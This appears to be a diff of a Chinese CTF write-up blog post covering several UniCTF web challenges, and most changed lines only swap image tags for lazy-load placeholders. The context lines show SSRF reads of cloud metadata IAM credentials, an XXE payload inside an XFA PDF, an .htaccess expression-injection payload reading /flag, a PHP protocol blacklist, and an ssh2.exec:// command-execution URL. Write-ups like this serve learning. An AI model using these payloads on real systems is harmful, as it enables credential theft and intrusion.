-<p><img src="/2026/04/23/UNICTF2025/image-20260418155507777.png" alt="image-20260418155507777"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418155507777.png" alt="image-20260418155507777"></p>
 <p>第一次接触这些概念，记录一下。先看一下题目描述</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418155726702.png" alt="image-20260418155726702"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418155726702.png" alt="image-20260418155726702"></p>
 <p>这里提及到敏感数据，就是上图说的。</p>
 <p><strong>169.254.169.254</strong></p>
 <p>这是几乎所有公有云厂商（AWS、阿里云、腾讯云、华为云） 虚拟机内部固定的元数据服务 IP，我们在云上创建一台虚拟机时，云厂商会给机器提供一个元数据服务（IMDS），让这台机器通过访问特定的内网地址（比如<code>169.254.169.254</code>）来查询自己的信息。信息包括<code>实例ID</code>、<code>位置区域</code>、<code>私有IP和公有IP</code>、<code>IAM角色凭证</code>，我们可以通过SSRF获取这些信息</p>
@@ -332,18 +229,18 @@
 <p>参考网上的wp这一题又来两种解法，存在非预期解。都复现以下</p>
 <p>非预期解：</p>
 <p>就是fuzz测试这个url，当测试&#96;<a target="_blank" rel="noopener" href="http://metadata/">http://metadata</a></p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418161838548.png" alt="image-20260418161838548"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418161838548.png" alt="image-20260418161838548"></p>
 <p>提示给了端口在1338，然后就是查看元数据了，</p>
 <p>查看角色名</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://metadata:1338/latest/meta-data/iam/security-credentials/</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2026/04/23/UNICTF2025/image-20260418162541316.png" alt="image-20260418162541316"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418162541316.png" alt="image-20260418162541316"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clouddiag-instance-role</span><br></pre></td></tr></table></figure>
 
 <p>读取敏感数据</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://metadata:1338/latest/meta-data/iam/security-credentials/clouddiag-instance-role</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2026/04/23/UNICTF2025/image-20260418162658169.png" alt="image-20260418162658169"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418162658169.png" alt="image-20260418162658169"></p>
 <p><strong>Access Key ID</strong>：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AKIA40A6E630FB5E4485</span><br></pre></td></tr></table></figure>
 
@@ -354,20 +251,20 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b18552dac18647fd96a76de6955a13a6e78c708e9c16417692d0e430f3fab716</span><br></pre></td></tr></table></figure>
 
 <p>查看储存桶</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418162810558.png" alt="image-20260418162810558"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418162810558.png" alt="image-20260418162810558"></p>
 <p>查看第一个桶</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418162912578.png" alt="image-20260418162912578"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418162912578.png" alt="image-20260418162912578"></p>
 <p>查看flag</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418162931039.png" alt="image-20260418162931039"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418162931039.png" alt="image-20260418162931039"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UniCTF&#123;ebf324db-a8da-4c89-87ec-fd6ba6fe9cfa&#125;</span><br></pre></td></tr></table></figure>
 
 <p>预期解就是在登入界面存在弱口令</p>
 <p>这里在注册时用户名尝试admin，root。发现存在root用户，爆破密码</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418163723143.png" alt="image-20260418163723143"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418163723143.png" alt="image-20260418163723143"></p>
 <p>root&#x2F;root123</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418163831186.png" alt="image-20260418163831186"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418163831186.png" alt="image-20260418163831186"></p>
 <p>查看这个任务</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418163852691.png" alt="image-20260418163852691"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418163852691.png" alt="image-20260418163852691"></p>
 <p>这里就给出了url接下来就是读取敏感信息了。步骤同上</p>
 <h2 id="ezUpload"><a href="#ezUpload" class="headerlink" title="ezUpload"></a>ezUpload</h2><p>考察的文件上传，不过上传的文件比较特殊，题目要求上传配置文件，上传限制：最大1kb，waf:？$ &amp; ; |&#96; \ &lt;,没有php代码。</p>
 <p>这里主要时Apache HTTP Server2.4.65的配置问题导致问题。通过表达式注入读取文件</p>
@@ -376,7 +273,7 @@
 
 <p>file:&#x2F;path<code>是 Apache 表达式内置函数，可读取服务器本地文件内容并写入响应头</code>X-Secret</p>
 <p>然后在随便上传一个文件，访问即可得到flag</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418170553983.png" alt="image-20260418170553983"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418170553983.png" alt="image-20260418170553983"></p>
 <h2 id="SecureDoc"><a href="#SecureDoc" class="headerlink" title="SecureDoc"></a>SecureDoc</h2><p>又是一个文件上传，这个要上传的时pdf，代码提示</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XFA-based dynamic forms</span><br></pre></td></tr></table></figure>
 
@@ -384,7 +281,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt; ]&gt;</span><br><span class="line">&lt;xdp:xdp xmlns:xdp=&quot;http://ns.adobe.com/xdp/&quot;&gt;</span><br><span class="line">  &lt;xfa:datasets xmlns:xfa=&quot;http://www.xfa.org/schema/xfa-data/1.0/&quot;&gt;</span><br><span class="line">    &lt;data&gt;&amp;xxe;&lt;/data&gt;</span><br><span class="line">  &lt;/xfa:datasets&gt;</span><br><span class="line">&lt;/xdp:xdp&gt;</span><br></pre></td></tr></table></figure>
 
 <p>生成对应pdf上传</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418171734084.png" alt="image-20260418171734084"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418171734084.png" alt="image-20260418171734084"></p>
 <h2 id="一鸣唱吧"><a href="#一鸣唱吧" class="headerlink" title="一鸣唱吧"></a>一鸣唱吧</h2><p>尝试注册登陆进入，有文件上传，文件下载两个功能，只能上传wav，mp3格式，尝试上传1.mp3,发现对文件进行重命名，经过测试只有最后两个数字不一样。接下来就是fuzz测试。参考官方wp解法</p>
 <p>分别对最后两个数字还有文件后缀进行爆破。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://80-6f873b58-c495-4397-95b8-f9afb959de0f.challenge.ctfplus.cn//uploads/UNiCTF2026W1W2 -w num.txt:W1 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-extensions-lowercase.txt:W2</span><br></pre></td></tr></table></figure>
@@ -393,35 +290,35 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update &amp;&amp; apt install seclists -y</span><br></pre></td></tr></table></figure>
 
 <p>然后就可以爆破了</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418175022027.png" alt="image-20260418175022027"></p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418175048960.png" alt="image-20260418175048960"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418175022027.png" alt="image-20260418175022027"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418175048960.png" alt="image-20260418175048960"></p>
 <p>有这两个关键文件，在php文件时一个phpinfo，依旧非预期</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418175356263.png" alt="image-20260418175356263"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418175356263.png" alt="image-20260418175356263"></p>
 <p>预期解还有继续往往下做。打开db文件</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418175619114.png" alt="image-20260418175619114"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418175619114.png" alt="image-20260418175619114"></p>
 <p>这里给出了admin用户的hash值，查询一下</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418175729362.png" alt="image-20260418175729362"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418175729362.png" alt="image-20260418175729362"></p>
 <p>密码时admin888</p>
 <p>这里admin用户多了一个文件读取功能，先读取download.php</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 引入数据库连接</span><br><span class="line">require_once &#x27;includes/db.php&#x27;;</span><br><span class="line"></span><br><span class="line">if (session_status() === PHP_SESSION_NONE) &#123; session_start(); &#125;</span><br><span class="line"></span><br><span class="line">if (!isset($_SESSION[&#x27;user&#x27;])) &#123;</span><br><span class="line">    require_once &#x27;includes/header.php&#x27;;</span><br><span class="line">    die(&quot;&lt;div class=&#x27;container&#x27;&gt;&lt;p class=&#x27;error&#x27;&gt;请先登录会员系统！/ Access Denied&lt;/p&gt;&lt;/div&gt;&quot;);</span><br><span class="line">    require_once &#x27;includes/footer.php&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;preview&#x27;]) &amp;&amp; $_GET[&#x27;preview&#x27;] === &quot;true&quot; &amp;&amp; isset($_SESSION[&#x27;is_admin&#x27;]) &amp;&amp; $_SESSION[&#x27;is_admin&#x27;] == 1) &#123;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    $format = isset($_GET[&#x27;format&#x27;]) ? $_GET[&#x27;format&#x27;] : &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">    // ========================================</span><br><span class="line">    // 安全过滤：协议黑名单检查</span><br><span class="line">    // ========================================</span><br><span class="line">    $dangerousProtocols = [</span><br><span class="line">        &#x27;php://&#x27;,</span><br><span class="line">        &#x27;data://&#x27;,</span><br><span class="line">        &#x27;phar://&#x27;,</span><br><span class="line">        &#x27;zip://&#x27;,</span><br><span class="line">        &#x27;compress.zlib://&#x27;,</span><br><span class="line">        &#x27;compress.bzip2://&#x27;,</span><br><span class="line">        &#x27;zlib://&#x27;,</span><br><span class="line">        &#x27;glob://&#x27;,</span><br><span class="line">        &#x27;expect://&#x27;,</span><br><span class="line">        &#x27;input://&#x27;,</span><br><span class="line">        &#x27;http://&#x27;,</span><br><span class="line">        &#x27;https://&#x27;,</span><br><span class="line">        &#x27;ftp://&#x27;,</span><br><span class="line">        &#x27;ftps://&#x27;,</span><br><span class="line">        &#x27;dict://&#x27;,</span><br><span class="line">        &#x27;gopher://&#x27;,</span><br><span class="line">        &#x27;tftp://&#x27;,</span><br><span class="line">        &#x27;ldap://&#x27;,</span><br><span class="line">        &#x27;ssh2.sftp://&#x27;,</span><br><span class="line">        &#x27;ssh2.scp://&#x27;,</span><br><span class="line">        &#x27;ssh2.tunnel://&#x27;,</span><br><span class="line">        &#x27;rar://&#x27;,</span><br><span class="line">        &#x27;ogg://&#x27;,</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    foreach ($dangerousProtocols as $protocol) &#123;</span><br><span class="line">        if (stripos($format, $protocol) !== false) &#123;</span><br><span class="line">            require_once &#x27;includes/header.php&#x27;;</span><br><span class="line">            echo &quot;&lt;div class=&#x27;container&#x27;&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;p class=&#x27;error&#x27;&gt;⚠️ 安全警告：禁止使用该协议 &quot; . htmlspecialchars($protocol) . &quot;&lt;/p&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;p&gt;系统检测到潜在的安全风险，已拦截此次请求。&lt;/p&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;/div&gt;&quot;;</span><br><span class="line">            require_once &#x27;includes/footer.php&#x27;;</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // ========================================</span><br><span class="line"></span><br><span class="line">    $full_path = $format;</span><br><span class="line"></span><br><span class="line">    $is_viewing_source = (strpos($format, &#x27;file://&#x27;) === 0);</span><br><span class="line"></span><br><span class="line">    if ($is_viewing_source) &#123;</span><br><span class="line">        header(&#x27;Content-Type: text/plain; charset=utf-8&#x27;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);</span><br><span class="line">        require_once &#x27;includes/header.php&#x27;;</span><br><span class="line">        echo &quot;&lt;div class=&#x27;container&#x27;&gt;&lt;h2 class=&#x27;neon-text&#x27;&gt;🔧 管理员预览控制台&lt;/h2&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;p class=&#x27;message&#x27;&gt;正在尝试加载资源流: &lt;strong&gt;&quot; . htmlspecialchars($full_path) . &quot;&lt;/strong&gt;&lt;/p&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;div style=&#x27;background: #000; padding: 15px; border: 1px solid #333; font-family: monospace; color: #0f0; white-space: pre-wrap;&#x27;&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line"></span><br><span class="line">        $handle = @fopen($full_path, &#x27;r&#x27;);</span><br><span class="line"></span><br><span class="line">        if ($handle) &#123;</span><br><span class="line">            $content = stream_get_contents($handle);</span><br><span class="line">            </span><br><span class="line">            if ($is_viewing_source) &#123;</span><br><span class="line">                echo $content; </span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                echo htmlspecialchars($content); </span><br><span class="line">            &#125;</span><br><span class="line">            fclose($handle);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;Error: 资源加载失败。\n&quot;;</span><br><span class="line">            echo &quot;可能的原因为：\n&quot;;</span><br><span class="line">            echo &quot;1. 文件路径不存在\n&quot;;</span><br><span class="line">            echo &quot;2. 权限不足 (Permission Denied)\n&quot;;</span><br><span class="line">            echo &quot;3. 协议格式错误\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; catch (Exception $e) &#123;</span><br><span class="line">        echo &quot;System Error: &quot; . $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if (!$is_viewing_source) &#123;</span><br><span class="line">        echo &quot;&lt;/div&gt;&lt;/div&gt;&quot;; // 关闭 console 和 container</span><br><span class="line">        require_once &#x27;includes/footer.php&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    exit; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//普通会员文件下载</span><br><span class="line"></span><br><span class="line">require_once &#x27;includes/header.php&#x27;;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line"></span><br><span class="line">    if (strpos($file, &#x27;..&#x27;) === false &amp;&amp; strpos($file, &#x27;/&#x27;) === false) &#123;</span><br><span class="line">        $filepath = &quot;uploads/&quot; . $file;</span><br><span class="line">        if (file_exists($filepath)) &#123;</span><br><span class="line">            header(&#x27;Content-Type: application/octet-stream&#x27;);</span><br><span class="line">            header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27;.basename($filepath).&#x27;&quot;&#x27;);</span><br><span class="line">            header(&#x27;Content-Length: &#x27; . filesize($filepath));</span><br><span class="line">            readfile($filepath);</span><br><span class="line">            exit;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">             echo &quot;&lt;p class=&#x27;error&#x27;&gt;文件不存在或已被移除。&lt;/p&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">         echo &quot;&lt;p class=&#x27;error&#x27;&gt;非法请求。&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$admin_panel = &#x27;&#x27;;</span><br><span class="line">if (isset($_SESSION[&#x27;is_admin&#x27;]) &amp;&amp; $_SESSION[&#x27;is_admin&#x27;] == 1) &#123;</span><br><span class="line">    $current_dir = __DIR__; </span><br><span class="line">    $admin_panel = &lt;&lt;&lt;HTML</span><br><span class="line">    &lt;div class=&quot;admin-panel&quot;&gt;</span><br><span class="line">        &lt;h3 class=&quot;neon-text&quot;&gt;🔧 管理员内部预览 (Dev Mode)&lt;/h3&gt;</span><br><span class="line">        &lt;p style=&quot;color: gray; font-size: 0.8em;&quot;&gt;当前 Web 根目录: &#123;$current_dir&#125;&lt;/p&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;form method=&quot;get&quot; target=&quot;_blank&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;hidden&quot; name=&quot;preview&quot; value=&quot;true&quot;&gt;</span><br><span class="line">            &lt;label&gt;Resource URI:&lt;/label&gt;</span><br><span class="line">            &lt;input type=&quot;text&quot; name=&quot;format&quot; placeholder=&quot;例如: file://&#123;$current_dir&#125;/index.php&quot; style=&quot;width: 70%;&quot; required&gt;</span><br><span class="line">            &lt;button type=&quot;submit&quot;&gt;加载资源&lt;/button&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">HTML;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;h2 class=&quot;neon-text&quot;&gt;🎵 一鸣曲库 (归档中心)&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;这里存放着系统归档文件。普通会员可根据文件名下载。&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style=&quot;margin-top: 30px; padding: 20px; background: rgba(0,0,0,0.3);&quot;&gt;</span><br><span class="line">    &lt;h3&gt;📥 歌曲/文件下载&lt;/h3&gt;</span><br><span class="line">    &lt;form method=&quot;get&quot;&gt;</span><br><span class="line">        文件名: &lt;input type=&quot;text&quot; name=&quot;file&quot; placeholder=&quot;输入文件名, 如 MGSG202500.mp3&quot;&gt;</span><br><span class="line">        &lt;button type=&quot;submit&quot;&gt;下载文件&lt;/button&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">echo $admin_panel;</span><br><span class="line">require_once &#x27;includes/footer.php&#x27;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>这里可以进行文件读取，file:&#x2F;&#x2F;协议可以使用，可以读取&#x2F;etc&#x2F;passwd文件，但是读取不了&#x2F;flag</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418181522859.png" alt="image-20260418181522859"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418181522859.png" alt="image-20260418181522859"></p>
 <p>看来要进行rce了。看wp是用到了据ssh2模块的定义，其中有一个ssh2.exec:&#x2F;&#x2F;协议，该协议可以在远程ssh上执行命令。但需要获得一个ssh用户的凭证。 该协议的格式是这样的：ssh2.exec:&#x2F;&#x2F;user:pass@ip&#x2F;cmd</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418182414697.png" alt="image-20260418182414697"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418182414697.png" alt="image-20260418182414697"></p>
 <p>依旧报错，尝试换一个用户凭证</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418182915821.png" alt="image-20260418182915821"></p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418183102755.png" alt="image-20260418183102755"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418182915821.png" alt="image-20260418182915821"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418183102755.png" alt="image-20260418183102755"></p>
 <p>这里执行了的但是没回显，写入静态文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download.php?preview=true&amp;format=ssh2.exec://ctfer:duhgrl@127.0.0.1:22/ls%20/&gt;/var/www/html/1.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2026/04/23/UNICTF2025/image-20260418183230784.png" alt="image-20260418183230784"></p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418183509488.png" alt="image-20260418183509488"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418183230784.png" alt="image-20260418183230784"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418183509488.png" alt="image-20260418183509488"></p>
 <h2 id="ezUpload-Revenge"><a href="#ezUpload-Revenge" class="headerlink" title="ezUpload Revenge!!"></a>ezUpload Revenge!!</h2><p>payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond expr &quot;file(&#x27;/flag&#x27;) =~ /(.+)/&quot;</span><br><span class="line">RewriteRule .* - [E=FLAG_CONTENT:%1]</span><br><span class="line">Header set X-Test-Expr &quot;%&#123;FLAG_CONTENT&#125;e&quot;</span><br></pre></td></tr></table></figure>
 
 <p>使用file读取flag并存入环境变量，然后设置响应头返回</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260418185414574.png" alt="image-20260418185414574"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260418185414574.png" alt="image-20260418185414574"></p>
 <h2 id="Intrasight"><a href="#Intrasight" class="headerlink" title="Intrasight"></a>Intrasight</h2><p>在源码注释中有提示</p>
